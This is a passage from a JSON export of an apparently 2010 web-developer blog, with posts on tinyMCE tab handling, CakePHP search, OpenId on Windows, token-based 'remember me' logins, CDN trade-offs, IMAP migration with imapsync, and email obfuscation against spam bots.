form.</p>\n<h4>Listening to the tab key</h4>\n<p>Anyway, I decided to hook on the <code>keyDown </code>event and listen to the tab key being pressed. This way I could manually jump focus to the next field when tab is pressed, or insert a tab character when Shift+Tab is pressed (for example).</p>\n<p>I used the tinyMCE event helper methods and wrote this (just add it right after the previous <code>editor.onInit.add</code> code) :</p>\n<pre><code lang=\"js\">// We hook on the tab key. One press will jump to the next focusable field. Maj+tab will insert a tab<br />editor.onKeyDown.add(function(editor, event) {<br />\t// We only listen for the tab key<br />\tif (event.keyCode!=9) return;<br />        <br />\t// Shift + tab will insert a tab<br />\tif (event.shiftKey) {<br />\t\teditor.execCommand('mceInsertContent', false, \"\\t\");<br />\t\ttinymce.dom.Event.cancel(event);<br />\t\treturn;<br />\t}<br />\t// Just pressing tab will jump to the next element<br />\tvar tabindex = $('#'+editor.editorId+'_ifr').attr('tabindex');<br />\t// We get all the tabindexed elements of the page<br />\tvar inputs = [];<br />\t$(':input[tabindex]').each(function() {<br />\t\tinputs[$(this).attr('tabindex')] = this;<br />\t});<br />\t// We find the next after our element and focus it<br />\tfor (var position in inputs) {<br />\t\tif (position&lt;=tabindex) continue;<br />\t\tinputs[position].focus();<br />\t\tbreak;<br />\t}<br /><br />\ttinymce.dom.Event.cancel(event);<br />\treturn;<br />});<br /></code></pre><p>First, we discard any key press that is not a tab key.</p>\n<p>Then we check if the Shift key is pressed, and if so we add a tab character and stop there.</p>\n<p>The biggest part is jumping to the next field. I can't revert to the browser default for that because every browser default behavior is different and I surely don't want to do some browser sniffing.</p>\n<p>I first get the list of all the input fields that have a <code>tabindex </code>value (your fields should have one), then I sort them in <code>tabindex </code>order and then loop through the list and stop when I've found one with a bigger <code>tabindex </code>that the actual field. I focus this one and stop the loop.</p>\n<h4>One final word</h4>\n<p>I've tested under Firefox 3.6, Chrome, Safari and Opera. Haven't tested IE yet because I still have a lot of other scripts to debug in IE first.</p>\n<p>As said earlier, maybe you could skip the whole tabindex listing if you intelligently revert to browser default for the browser that will jump to the next field but I have no idea how to test for that.</p>",
  "publish_start": "2010-05-12 11:53:00",
  "slug": "tabindexing-and-inserting-tabs-with-tinymce"
}, {
  "id": 162,
  "name": "\"failed to import extension hgext.imerge\" warning on Dreamhost",
  "text": "<p>Trying to push some new code to a Hg repository on my Dreamhost account, I had the following error message :</p>\n<pre><code lang=\"sh\">remote: *** failed to import extension hgext.imerge: No module named imerge<br /></code></pre>\n<p>I used to have the same kind of issues with an other extensions, <code>hgext/hbisect</code> a while ago and I fixed it by forcing Hg to not use this extension.</p>\n<p>Here's how :</p>\n<p>Edit your <code>.hgrc</code> file and under the <code>[extensions]</code> category, add <code>hgext.imerge=!</code>, like this</p>\n<pre><code lang=\"ini\">[extensions]<br />hgext/hbisect = !<br />hgext.imerge=!</code></pre>\n<p>This should stop the warning.</p>",
  "publish_start": "2010-05-14 09:13:00",
  "slug": "failed-to-import-extension-hgext-imerge-warning-on-dreamhost"
}, {
  "id": 166,
  "name": "Unable to send mail to same server",
  "text": "<p>I just realized that one of my domains was sending mails (in PHP), but I never actually received them.</p>\n<p>I first tested the mail adress, sending mails from a personal adress. I then tested the <code>mail()</code> php function, sending mail to a personal adress. But all that was working fine.</p>\n<p>But sending mails in PHP on www.server.com to name@server.com did nothing. No mail, no error.</p>\n<h4>Damn you Gmail</h4>\n<p>After some digging it appears that local mails (to addresses on the same server) were using some sort of special local delivery.</p>\n<p>I recently moved the whole mail handling stuff from this server to Google Apps, but I forgot to remove/edit the postfix configuration file so the local delivery routine was still up and local mails where internally routed.</p>\n<p>So, I just had to edit the <code>/etc/postfix/main.cf</code> file, find the <code>mydestination </code>line and remove any reference to my server here.</p>\n<p>Then, just restart postfix by doing a</p>\n<pre><code lang=\"sh\">postfix restart<br /></code></pre>\n<h4>It still doesn't work</h4>\n<p>In my case, it still didn't change anything... That's when I understood that postfix was using a <code>vmail</code> mysql database to check for existing domains.</p>\n<p>I renamed the <code>domain </code>field value in the <code>domains </code>table, and I can now correctly receive mails.</p>\n<h4>But, I have lost a lot of mails !</h4>\n<p>No you don't, as they are routed by the local delivery system, they should be somewhere on your hard drive. In my case it was in the <code>/home/mailusers/</code> directory</p>",
  "publish_start": "2010-05-15 08:53:00",
  "slug": "unable-to-send-mail-to-same-server"
}, {
  "id": 170,
  "name": "Paginated search results and custom url",
  "text": "<p>I wanted for this blog a search feature, but I had some <span class=\"searchmatch\">prerequisites</span> for it :</p>\n<ul>\n<li>The search url could be bookmarked</li>\n<li>It should be paginated</li>\n<li>It should play well with my custom url starting with /blog</li>\n</ul>\n<h4>Defining custom urls</h4>\n<p>Here are the two routes I defined in my routes.php</p>\n<pre><code lang=\"php\">Router::connect('/blog/search/:keyword',<br />    array('controller' =&gt; 'posts', 'action' =&gt; 'search'),<br />    array(<br />        'pass' =&gt; array('keyword'),<br />        'keyword' =&gt; '[^/]+'<br />    )<br />);<br />Router::connect('/blog/search/*', array('controller' =&gt; 'posts', 'action' =&gt; 'search'));<br /></code></pre>\n<p>Going to<code> /blog/search/*keyword*</code> will start a search on the keyword, while going to <code>/blog/search/ </code>would display a search form.</p>\n<h4>Writing the method</h4>\n<p>I started by creating a <code>search </code>action in my <code>PostController</code>, then creating a form submitting to this action, with a <code>keyword </code>input field.</p>\n<p>In the <code>search </code>method, the first thing I do is checking if some POST data is submitted (coming from the search form). If so, I redirect to the same page, but passing the <code>keyword </code>as first parameter.</p>\n<p>If no <code>keyword </code>is passed nor data submitted, I'll display a simple search form.</p>\n<p>And finally if a <code>keyword </code>is specified, I'll do a paginated search on every posts whose <code>name </code>or <code>text </code>contains the <code>keyword</code>.</p>\n<pre><code lang=\"php\">function search() {<br />\t// We redirect to get it in GET mode<br />\tif (!empty($this-&gt;data)) {<br />\t\treturn $this-&gt;redirect(array('keyword' =&gt; urlencode($this-&gt;data['Post']['keyword'])));<br />\t}<br />\t<br />\t// Search index<br />\tif (empty($keyword)) {<br />\t\treturn $this-&gt;render('search_index');<br />\t}<br /><br />\t// Adding conditions to name and text<br />\t$keyword = urldecode($keyword);<br />\t$this-&gt;paginate = Set::merge(<br />\t\t$this-&gt;paginate,<br />\t\tarray(<br />\t\t\t'conditions' =&gt; array(<br />\t\t\t\t'AND' =&gt; array(<br />\t\t\t\t\t'OR' =&gt; array(<br />\t\t\t\t\t\t'Post.name LIKE' =&gt; '%'.$keyword.'%',<br />\t\t\t\t\t\t'Post.text LIKE' =&gt; '%'.$keyword.'%'<br />\t\t\t\t\t)<br />\t\t\t\t)<br />\t\t\t)<br />\t\t)<br />\t);<br />\t// Getting paginated result<br />\t$itemList = $this-&gt;paginate();<br /><br />\t$this-&gt;set(array(<br />\t\t'keyword' =&gt; $keyword,<br />\t\t'itemList' =&gt; $itemList<br />\t));<br />}<br /></code></pre>\n<p> </p>",
  "publish_start": "2010-05-19 15:02:00",
  "slug": "paginated-search-results-and-custom-url"
}, {
  "id": 171,
  "name": "Using cakePHP OpenId plugin on Windows",
  "text": "<p>After all the praises I've read about OpenId, I decided to implement it in this CMS. My goal was to set an easy way for readers to leave comments without the need for registering to anything.</p>\n<p>I thought it would also be great to add as a secondary, and easiest, mechanism for logging in.</p>\n<p>So I downloaded and installed the openID component by cakebaker. As I'm running my dev environment under Windows, I had to set some settings.</p>\n<h4>Fixing the pluginPath</h4>\n<p>I've save the OpenId component in a plugin, and it has a clever mechanism to import the PHP OpenId library based on the folder it is saved.</p>\n<p>Unfortunatly, the regexp used to know the name of the current plugin was throwing errors on Windows, due to the backslashes used in the file path.</p>\n<p>I updated the <code>getPluginName()</code> method to this new one and it did the trick :</p>\n<pre><code lang=\"php\">private function getPluginName() {<br />        $result = array();<br />        $ds = (Folder::isWindowsPath(__FILE__)) ? '\\\\\\\\' : DS;<br />        if (preg_match('#'.$ds.'plugins'.$ds.'(.*)'.$ds.'controllers#', __FILE__, $result)) {<br />            return $result[1];<br />        }<br /><br />        return false;<br />    }<br /></code></pre><p>Basically it makes sure that the backslashes are correctly escaped under Windows.</p>\n<p>Edit : I've sent this patch to the OpenId component author and it is now fixed in the latest versions.</p>\n<h4>Generating randomness</h4>\n<p>The second fix was to change the <code>Auth_OpenID_RAND_SOURCE</code> constant to <code>null</code>. This constant enable the library to generate randomness (AFAIK), by using the <code>/dev/urandom</code>.</p>\n<p>This does not exists on Windows, so I added the following lines in my <code>bootstrap.php</code></p>\n<pre><code lang=\"php\">if (Folder::isWindowsPath(__FILE__)) {<br />    define('Auth_OpenID_RAND_SOURCE', null);<br />}<br /></code></pre><h4>Connecting to SSL servers</h4>\n<p>The PHP bundle on Windows comes with <code>cURL </code>already builtin, but without the bundle of the X.509 certificates of public CA. It means that the OpenId PHP library will refuse to connect to any CA using an SSL connection because it won't be able to check the certificate.</p>\n<p>This does not happens on Linux, the list is correctly built in.</p>\n<p>Fortunatly, we can pass a <code>CURLOPT_CAINFO</code> option to <code>cURL</code> to manually set a pre-defined bundle, and there already is one shipped with the PHP OpenId library.</p>\n<p>All you have to do is add the following line on line 93 of the <code>vendors/Auth/Yadis/ParanoidHTTPFetcher.php</code> file :</p>\n<pre><code lang=\"php\">curl_setopt($c, CURLOPT_CAINFO, str_replace('\\\\', '/', dirname(__FILE__)).'/../OpenID/ca-bundle.crt');</code></pre><p> </p>",
  "publish_start": "2010-05-21 15:16:00",
  "slug": "adding-openid-support"
}, {
  "id": 174,
  "name": "Doing persistent login the right way",
  "text": "<p>When I was a young web developer, I had to code an admin panel, with username and login. I also added the well-known \"Remember me\" checkbox.</p>\n<p>I wasn't really educated to the security concerns of developing such a feature. In fact, I was even storing the passwords as plain text in the database.</p>\n<p>And to allow the user to auto-login, I stored the user and password, in plain text, in a cookie and requested a login with those credentials whenever its session expired.</p>\n<h4>That's insane !</h4>\n<p>Yes it was, but I remember thinking \"Well, nobody can even have access to the database so there's no risk\" and \"I can store the password in the cookie, it is only accessible by the user, and he surely already know its password. There's no harm in that\"</p>\n<p>Well, XSS and CSRF weren't so common back in those days.</p>\n<p>Since then I've learned a lot. There's just no way I'll ever store a plain text or uncrypted password in a database again. Hashing and salting is the way to go.</p>\n<p>But I kept implementing the persistent login feature following the same pattern : saving the username and hashed password in the cookie.</p>\n<p>I was thinking \"The password is not stored as plain text but as a hash, there's no way an attacker would even be able to guess the password from that\".</p>\n<h4>That's better, but still...</h4>\n<p>I haven't thought that the cookie was like an open sesame to my app. One would just have to steal the file and place it in its browser cookie list and he would have exactly the same access to the website, without having to know my password.</p>\n<p>In the meantime I was also implementing OpenId authentication and as it is passwordless (at least from the website point of view), I couldn't save the username and password in the cookie.</p>\n<p>Clearly, something was broken in my persistent login implementation.</p>\n<h4>Here come the tokens</h4>\n<p>After some research, I finally get it the right way.</p>\n<p>Whenever a user authenticate, be it from a classical user/pass login form or using OpenId, I keep it loggued using session vars. When the session var expires, the user is loggued out. If he had checked the \"Remember me\" checkbox, I would try to re-authenticate him automatically.</p>\n<p>In order to do that, I had to change my implementation. The first thing to do was creating a <code>UserToken </code>table with 3 fields : <code>user_id</code>, <code>token</code><code> </code>and <code>duration</code>.</p>\n<p>Then, when the user authenticate I generate a random token and save it along the <code>user_id</code> in a cookie.</p>\n<p>I'll also populate the <code>UserToken </code>table with the <code>user_id</code>, a hashed version of the token,  and matching the <code>duration </code>to the expires date of the cookie.</p>\n<p>That way, the next time that the user comes to my website without a session I check its cookie. If he has a <code>user_id</code> and a token, I'll try to authenticate him.</p>\n<p>I'll find a matching <code>user_id</code> and hashed token. If there are no results, then the cookie is not valid. Either it has been already used or it is a cookie forgery attempt. In that case, I'll do nothing.</p>\n<p>If there's a match, I still check that the token is not expired. If it is, I'll delete it in the database, as well as clearing the cookie. On the other hand, if the cookie is still valid, I log the user in.</p>\n<p>Once the user is loggued in I generate a new token, update the cookie and update the table with a hashed version of it.</p>\n<p>That way each token can only be used once and are generated only when the user correctly authenticate and are only used once the session expires.</p>\n<h4>But one can still steal cookies</h4>\n<p>Yes, a malicious user can still steal my cookie, copy it to its computer and use the token to login. That's true and as we can't do anything against that, we could still try to mitigate it.</p>\n<p>First precaution would be to disable any sensitive information edition while loggued in using the cookie. Like bank account, personnal information, password changing, etc.</p>\n<p>The second thing would be to check for any hacking attempt. Whenever I guess for a forgery attempt (trying to login with a bad set of id / hashed token), I delete all UserToken associated for this user. This will block any bruteforce attack because even there won't be any more match in the database.</p>\n<p>It is also wise to display a warning message to the user telling him that his account may have been compromised and that he should be wary and maybe change its password.</p>",
  "publish_start": "2010-05-25 01:59:00",
  "slug": "doing-persistent-login-the-right-way"
}, {
  "id": 175,
  "name": "Pros and cons of using Google CDN for your assets",
  "text": "<p>With the recent Google Fonts breakout, much debate surfaces to know if it really was useful to use Google CDN to deliver your assets to your users.</p>\n<p>I used to think it was a goog thing because it allowed for parallelized download, but after reading really good articles on the subject I'm not so sure.</p>\n<p>I'll try to list the pros and cons of using Google CDN instead of serving your files locally.</p>\n<h4>Pros</h4>\n<ul>\n<li>Using a CDN assure you that your users will get content from the closest server around them, no matter where they are.</li>\n<li>The more websites will use Google CDN, the biggest the chance of your user already having the file in its cache</li>\n<li>Downloading from a CDN assure that you won't be sending useless cookies along the request. You shouldn't send cookies when fetching your static files anyway, but sometime -Google Analytics for example-, some script create domain-wide cookies that still get sent.</li>\n<li>Many niched major websites (ArmorGames.com, StackOverflow.com, etc) uses the CDN, so if a large part of your trafic is coming from one of those, using the CDN and the exact same library version will have no perfomance downsides for you.</li>\n</ul>\n<h4>Cons</h4>\n<ul>\n<li>Using a CDN create a new connection to access the ressource on an other server instead of using the already open connection to your website. Creating a new connection is slow.</li>\n<li>Caching of the files will only be possible if the exact same version url is used. E. using <code>/jquery/1.4.0/</code> instead of <code>/jquery/1.4/</code></li>\n<li>If you already are using your own CDN for your images, you should also use it for your javascript and in this case the google one is worthless because you already have all the advantages.</li>\n<li>An Internet connection is required. This may seem obvious but if you have to work on a project while on a trip, you'll need a local copy of the library.</li>\n</ul>\n<h4>Stalemate</h4>\n<ul>\n<li>Using a CDN force a DNS lookup. This lookup can be cached if the user already visited your website or another that use the same CDN however.</li>\n<li>Browsers have a limit of paralels downloads on the same host. Using a  CDN allow for more parallelization. But creating dummy subdomains like <code>static.domain.com</code> would also defeat this limitation.</li>\n<li>In the case of Javascript/CSS, packing all your files (scripts and  libraries) in one big file on your server and serving it gzipped will  result in a better compression that serving the library from a CDN and  your scripts from your server. On the other hand, the user would have to  re-download the whole package whenever you make a tiny change to your  scripts, even if you didn't changed the library.</li>\n<li>Downloading script usually block page execution. So reducing the number of scripts to load (by packing them in one file instead of downloading one locally and one on the CDN) will reduce the blocking time. On the other hand, merging two files will result in a longer download time (because the file is larger) while using the CDN would allow the two scripts to download in parallel.</li>\n<li>What happen if your CDN is down ? Well, when using Google that's not much a risk but still. As a side effect, you should'nt even consider using a CDN if your application is for an intranet.</li>\n</ul>\n<h4>Conclusion</h4>\n<p>As a conclusion, all I can answer to the \"Should I use the Google CDN for my javascript libraries ?\" is \"Well... it depends...\".</p>\n<p>Really it depends on your configuration. Run some tests, try with a CDN or by compressing the library into your main file. Check where your users are coming from and the average loading time. Test various configuration until you found the one that works the best for you.</p>\n<p>On a personal note I do use Google CDN for my websites. The cost of the DNS lookup and connection to the Google server is really worth the parallelized download in my case. But it may be so because I'm living in France and my website is hosted in the US, so a CDN really helps.</p>\n<h4>Source links</h4>\n<ul>\n<li>http://docs.google.com/document/pub?id=14Xn7kkKwVxSie6xHJwWRAP5mutM7qlWcrHgWtZo63gI</li>\n<li>http://zoompf.com/blog/2010/01/should-you-use-javascript-library-cdns</li>\n</ul>",
  "publish_start": "2010-05-25 13:03:00",
  "slug": "pros-cons-google-cdn-assets"
}, {
  "id": 176,
  "name": "Migrating mails from IMAP to IMAP (part 1/2)",
  "text": "<p>One of my clients wanted to change its hosting provider because of almost constant downtime. I suggested that we move the whole site and the associated email addresses to Dreamhost.</p>\n<p>He is heavily using its webmail, with a dozen of different accounts, all with custom address book and drafts to reuse.</p>\n<p>I had already moved a previous site of the same client to a GMail powered webmail and he wasn't so satisfied of it because of the lack of a \"draft\" feature that would allow him to reuse the same message templates.</p>\n<p>Its current webmail is powered by Imp (Horde) and the default Dreamhost webmail is Squirel Mail.</p>\n<p>So now I'm faced with a challenge. Which webmail should I choose and how will I initiate the migration ?</p>\n<h4>Contestant 1 : Horde</h4>\n<p>The easiest way would have been to reuse Horde. Horde has a nifty export/import function. It means that I could have exported the settings on the current host and imported them back in the new host.</p>\n<p>Unfortunatly, Horde is not pre-installed on Dreamhost. It means I would have to install it and I don't really want to do it. This is not my area of expertise and if something goes wrong it will take me ages to fix.</p>\n<p>Additionnaly, the default php5 install on Dreamhost lacks the IMAP extension needed and SSL connection requires an additional monthly fee.</p>\n<p>That would be the better solution for the client, but I don't feel capable of doing it.</p>\n<h4>Contestant 2 : Squirel Mail</h4>\n<p>Squirel Mail is the default webmail on Dreamhost. It means that they do handle all the heavy stuff of configuring it and making sure it does not crash.</p>\n<p>They assure me that I can have unlimited hosting of my mails, the only limits are a maximum of 100 SMTP sending per hour and no attached filed &gt; 7Mo.</p>\n<p>Those are almost no issues at all, we can handle that. I just have to check if the 100 sending per hour is for each mail address or for the entire account.</p>\n<p>The only problem will be that I can't export/import the horde feature into Squirel.</p>\n<p>What I could do however is synchronize the two IMAP servers, effectively copying all the mail from the current one to the new. Unfortunatly, there is no easy way to do that.</p>\n<p>The Dreamhost support even told me that it was impossible. I found a linux command named imapsynch however that maybe could help, but I'll need to know the name of the dreamhost imap server and needed credentials to connect to it. I'll sort this out with them.</p>\n<h4>Contestant 3 : GMail</h4>\n<p>I've already set mails up with GMail a couple of times in the past so this won't be too hard. Could take some times, but nothing difficult about that.</p>\n<p>I may be able to copy the current mails to the GMail server, I've seen some articles on the subject floating on the network, but I'll definitly won't be able to copy drafts.</p>\n<h4>Conclusion</h4>\n<p>I'm still in contact with the Dreamhost support to choose the better option. I don't think I'll install Horde, this will be too much work. I guess I'll go with the second option of migrating mails to Squirel Mail.</p>\n<p>Whatever solution I'll pick, I'll be sure to post the whole details here for others to follow.</p>\n<h4>Update</h4>\n<p><del>I finally won't have to migrate mails, the client makes regular POP backup of its mails so he will just do one more right before the transfer and will start over with a brand new mail boxes. Concerning the drafts, he will manually copy-paste them from one webmail to the other and he told me that he wasn't using the address book...</del></p>\n<p><del>So it appears that I'll just have to change the DNS to point to the new webmail and create a temporary CNAME to still access the old webmail on the old server until the migration is totally over.</del></p>\n<p>Re-update</p>\n<p>In fact, it appears that I won't be able to access both webmail at the same time. I'll have DNS issues, and the registrar panel that I have is very basic, I won't be able to fine tuned it correctly.</p>\n<p>It seems that I'll have to migrate mails from one server to the other.</p>",
  "publish_start": "2010-05-28 16:38:00",
  "slug": "migrating-mails-imap-part-1-2"
}, {
  "id": 177,
  "name": "New website",
  "text": "<p>I just uploaded the new version of the website. The old one was severely needing a fresh new look, so here it is.</p>\n<p>As I want to showcase my skills as a web developer I didn't want a website with a too awesome design, so I decided to do it all by myself. I'm quite happy with the result.</p>\n<p>The \"Work\" page is still in progress, images from the old site aren't yet available and I haven't yet tested it with IE.</p>\n<p>I've added a comment section (a feature that was lacking from the previous site). I plan to translate the site in French to have something fully bilingual, but that too is a work in progress.</p>\n<p>If you ever spot a bug, just drop a comment, I'm hunting them right now.</p>",
  "publish_start": "2010-05-31 08:20:00",
  "slug": "new-website"
}, {
  "id": 178,
  "name": "Opera bug : border-radius and background-color on an input",
  "text": "<p>The form inputs of this site all have a border-radius and a background-color. Unfortunatly, the latest Opera version just don't like that (9.5 works like a charm).</p>\n<p>When you apply the following rules to an input element, Opera will discard your background color and render it as transparent instead.</p>\n<pre><code lang=\"css\">input {<br />    border-radius:5px;<br />    border:none;<br />    background:#375a5e;<br />}</code></pre>\n<p>All three rules causes the bug. Remove one of them and the bug disappear.</p>\n<h4>Solution</h4>\n<p>At first I thought that I could just as well remove the border-radius rule and I won't have any more bugs. But a slightly decreased user experience for my Opera readers.</p>\n<p>Then I'll try to come up with a better solution. One can add a background-image instead of a background-color. Odd enough, this won't trigger the bug.</p>\n<p>But I wanted to avoid that, that's one more useless request to the server and it's far more easier to change a color code in a css file that to edit an image file.</p>\n<p>The solution I choose was to not set a <code>border:none;</code> but to simulate it by adding invisible border. That would add 1px around the input element, so we'll limit it by only adding the border on one of the sides. Adding it on the right side seemed to be the more convenient method.</p>\n<p>So here's my updated code :</p>\n<pre><code lang=\"css\">input {<br />\tborder-radius:5px;<br />\tborder:none;<br />\tborder-right:1px solid rgba(0,0,0,0);<br />\tbackground:#375a5e;<br />}</code></pre>\n<p> </p>",
  "publish_start": "2010-06-01 06:10:00",
  "slug": "opera-bug-border-radius-and-background-color-on-an-input"
}, {
  "id": 179,
  "name": "Overview of the different ways of protecting your email address",
  "text": "<p>You surely know that displaying an email address as plain text in a website today is a sure way to get your mailbox full of viagra, rolex and poker ads in no time.</p>\n<p>Spammer have bots running all day long, crawling through hundred of thousands of pages, grabbing everything that looks like something@somewhere.com.</p>\n<p>Before going any</p>\n<h4>Existing way of protecting your email address</h4>\n<p>The safest way is to not display it in the first place. Nothing beats that. But if you really need to be contacted through email, here are some of the possible alternative.</p>\n<h5>Using a contact form instead.</h5>\n<p>That's what I'm doing on this very own site.</p>\n<p>This way I don't have to display my address, I let my server script send the email for me.</p>\n<p>Unfortunatly, it means that you have to protect your contact form against spam now. How to do that is not the scope of this post, however.</p>\n<h5>Using an image</h5>\n<p>Instead of writing your email as plain text, you can use an image inside which your email is written. Spam bots can't read images (well, they <strong>could</strong> but they won't bother when there is still so many clear email they can grab without worrying about images).</p>\n<p>Unfortunatly it has two drawbacks. First, you force your reader to type your email as they can't copy/paste it. This lead to possible typos, and more importantly will frustrate your user.</p>\n<p>Secondly, people browsing without images (yes, that does exists, either because they have a slow connection, browsing through an old mobile phone or using a text reader) won't be able to contact you.</p>\n<h5>Spelling it aloud</h5>\n<p>One of the better way is still to appeal to the human brain and telling your user what your email is, like \"my name, at, my domain dot com\" or \"tim@nowhere.com where you have to change nowhere to pixelastic\".</p>\n<p>I've even seen someone using the very long form of : \"tee ee em at pee hi ex ee el ah ess tee hi see dot see oh em\". Sure, spammer won't get that, but the truth is, not many user won't either.</p>\n<p>The drawback of this method is the same as the previous one, you force your user to type your address.</p>\n<h4>Ain't there an easiest way ?</h4>\n<p>Would'nt it be better if we hadn't to worry about that. If there was a way that all our reader would read the email, click on it and send us a mail ? While being protected from spam bots ?</p>\n<p>Well, there have been attempt to do that, using various server side and client side techniques. Unfortunatly, all of them failed for at least one type of users.</p>\n<h5>Encrypting email using unicode</h5>\n<p>One can encrypt any string in Unicode using server script language. It will turn every character into an entity like &amp;#46;. Your browser will stil understand it correctly, and display it as the corresponding value.</p>\n<p>We could assume that bots won't understand it, but I have no data to back that up. It would be trivial for an harvest bot to parse email using unicode, so I won't recommend it.</p>\n<h5>Using CSS to display the mail</h5>\n<p>Modern browser, with great CSS support can help in this process with the use of generated content and the :after pseudo class.</p>\n<p>Let's look at the following code :</p>\n<pre><code lang=\"html\">&lt;span class=\"email\" rel=\"@pixelastic.com\"&gt;tim&lt;/span&gt;</code></pre>\n<pre><code lang=\"css\">span.email[rel]:after {<br />\tcontent: attr(rel);<br />}<br /></code></pre>\n<p>You just put your username in the <code>span</code>, and the domain name in the <code>rel </code>attribute and let CSS display it as one single email address.</p>\n<p>But you need a browser with a correct CSS support to do that, otherwise you will only see the user part, which is not really useful.</p>\n<h5>Using an HTTP redirect</h5>\n<p>This one is a clever one that I haven't seen used a lot. Instead of making a link to a mailto:, you make the link go to a mail.php page that will only contain one php statement :</p>\n<pre><code lang=\"php\">header('Location: mailto:user@domain.com');<br /></code></pre>\n<p>I'm not sure of the browser support of this, however. And it still won't solve the problem of displaying your email address.</p>\n<h5>Adding HTML noise</h5>\n<p>You can add HTML comments (<code>&lt;!--  --&gt;</code>), or useless elements (<code>&lt;span /&gt;</code>) all  around your email adress. They won't get processed by your browser that  will still display it as normal, but it will most likely make the spam  bot choke.</p>\n<p>Unfortunatly, you can't use them in the <code>href=\"mailto:\"</code> section of your link, so it is not a perfect fit either. But still, that's a good start.</p>\n<h5>Using Javascript to populate the email</h5>\n<p>The principle behind this one is that Javascript will write the email adress for you in the code. As most spam bots won't have Javascript enabled (again, I don't have source to back that up but I assume so), they won't be able to see it.</p>\n<p>Just write your email address in a Javascript file, maybe in several different variables that you'll merge to create the final one. The more obfuscated your code is, the harder it will be for the spammer to add its logic to its bot.</p>\n<h4>Conclusion</h4>\n<p>There isn't one perfect solution yet. But maybe, merging several of them we could bypass the weaknesses to create something that really handle all the situations.</p>\n<p>I have some ideas in the back of my head actually, I'll try to make something with them and post it here.</p>\n<p>I'm pretty sure starting with an obfuscated HTML source (but still correctlt displaying), then adding an obfuscated Javascript layer to create the <code>mailto:</code> link is the way to go.</p>\n<p>This would mean a better user experience for users with Javascript, but that's ok, that's what Javascript is for.</p>",
  "publish_start": "2010-06-03 09:41:00",
  "slug": "overview-of-the-different-ways-of-protecting-your-email-address"
}, {
  "id": 180,
  "name": "Migrating mails from IMAP to IMAP (part 2/2)",
  "text": "<p>I'll finally have to migrate mails from one IMAP server to another because of a change in the hosting provider of one of my clients.</p>\n<p>Let me first do a quick review of my current config :</p>\n<p>I have an IMAP server on a not-so-reliable host. I need to move all the mailboxes to a brand new Dreamhost server.</p>\n<p>The current host use horde/imp as its webmail, but Dreamhost is running under Squirel Mail.</p>\n<h4>How to do that ?</h4>\n<p>When I first contacted Dreamhost to ask them the better way to copy the content of my old IMAP server to their new one, they told me that IMAP to IMAP transfer was unfortunatly not possible.</p>\n<p>After some digging I found a little linux tool called <code>imapsync </code>that was developped to synchronize two IMAP servers. As I only wanted to copy content from one server to an empty one, I guess it should work.</p>\n<p>And it does.</p>\n<h4>Installing the tool</h4>\n<p>First of all, you really need to have a Linux machine. I'm sorry for all Windows and Mac users out there, but this solution will only work with Linux.</p>\n<p>Obviously, you'll first have to download and install it.</p>\n<p>I'm a newbie linux user, and don't use it at its full potential. It means that I rely a lot on the UI, I don't know most of the more basics commands.</p>\n<p>So, I don't know the correct procedure to install something, I always use the Synaptic Packager Manager UI. I just have to type <code>imapsync</code>, check its checkbox and start the install.</p>\n<p>I guess you, more experienced linux user, would know how to do that anyway.</p>\n<h4>Running the command</h4>\n<p>Once it's installed, you'll just have to run one command. But before typing it, you have make sure that you have all the required informations.</p>\n<p>You'll need the server name, login and pass of both the source and destination account.</p>\n<p>In my case I had previously reset all the password to newly generated one on the source server, then created the same email (with same password) on the destination server.</p>\n<p>For the source server name, you shouldn't have any problem finding it. It usually is something like <code>mail.domain.co</code>m.</p>\n<p>But for the destination server, that's a little more tricky. As I haven't yet changed DNS, I have a Dreamhost server but no domain name pointing to it. So I can't use <code>mail.domain.com</code> there.</p>\n<p>I had to go my Dreamhost DNS panel (clicking on DNS under the name of my domain in Manage domain) and check for the IP address associated with the <code>mail A</code> entry.</p>\n<p>Once you have all this, create a file (name it <code>pass</code>) which contain the password of your account (or <code>pass1 </code>and <code>pass2 </code>if source and destination password aren't the same). This is done so you won't type in clear text the password of your accounts, or they could be found in the history files.</p>\n<p>Once it's done, just run the following command</p>\n<pre><code lang=\"sh\">imapsync --host1 mail.domain.com --user1 contact@domain.com --passfile1 /path/to/pass1 --host2 208.97.XXX.XXX --user2 contact@domain.com --passfile2 /path/to/pass2 --noauthmd5<br /></code></pre>\n<p>It is not an instant process, actually in can be quite long. One of the mailbox I had to move had more than 20.000 mails in the sent folder and about 40.000 in the received one. It took me almost 18h to complete.</p>",
  "publish_start": "2010-06-04 11:10:00",
  "slug": "migrating-mails-from-imap-to-imap-part-2-2"
}, {
  "id": 181,
  "name": "Arsys, a registrar to avoid",
  "text": "<p>When I use great registrars or hosting services, I say so, and loudly. From all those that I have tested, there is no better registrar than Gandi and no better hosting service than Dreamhost.</p>\n<p>But when I encounter really lousy services, I won't hide to say so too.</p>\n<p>Arsys is one of them. It's a franco-german<ins>-spanish</ins> registrar. I just needed to change the DNS server of a domain on it, and even that was impossible.</p>\n<p>When I tried to put Dreamhost NS servers in the form and submit it, I was greeted with a bold red error message telling me that an error occured and asking me to try again later.</p>\n<p>I did try again later, just to receive the exact same error message.</p>\n<p>I wouldn't have to leave Arsys default NS servers if at least they allowed me to configure A, CNAME and MX records as I wanted but unfortunatly, none of this is available.</p>\n<p>I tried to contact their support service, to tell them my problem, but here again I was faced with an error message on a blank page (in spanish this time) telling me that the server encountered a problem and that I needed to contact an administrator (sic)</p>\n<p>So I tried to find a contact page on their public site, and after some 404 errors finally found an email address.</p>\n<p>I send them a email telling them about my problems. They answer stating that if I have any problem, I should use their contact form to contact hostmaster@arsys.fr. I tried, and this time it worked.</p>\n<p>It's been 4 days, and I haven't heard from them yet. In the meantime, I choose to quit this registrar and moved the domain to Gandi.</p>\n<p>What is the most strange is that when you google them you got lot of praises about their wonderful customer service... After having tested it, I just don't buy it.</p>",
  "publish_start": "2010-06-06 05:01:00",
  "slug": "arsys-a-registrar-to-avoid"
}, {
  "id": 231,
  "name": "Preventing tinyMCE from wrapping <img /> in <p>",
